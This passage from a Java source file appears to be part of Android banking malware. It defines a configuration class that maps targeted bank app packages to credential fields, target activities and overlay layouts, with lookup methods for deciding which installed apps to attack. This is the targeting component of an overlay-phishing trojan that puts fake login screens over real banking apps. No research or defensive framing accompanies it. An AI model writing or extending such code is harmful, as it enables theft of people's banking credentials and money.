            "axis_overlay"
        ));
    }
    
    public static class BankingAppConfig {
        String bankName;
        String[] credentialFields;
        String[] targetActivities;
        String overlayLayout;
        
        public BankingAppConfig(String bankName, String[] credentialFields, 
                               String[] targetActivities, String overlayLayout) {
            this.bankName = bankName;
            this.credentialFields = credentialFields;
            this.targetActivities = targetActivities;
            this.overlayLayout = overlayLayout;
        }
    }
    
    public static BankingAppConfig getConfigForPackage(String packageName) {
        return TARGET_APPS.get(packageName);
    }
    
    public static boolean isBankingApp(String packageName) {
        return TARGET_APPS.containsKey(packageName);
    }
}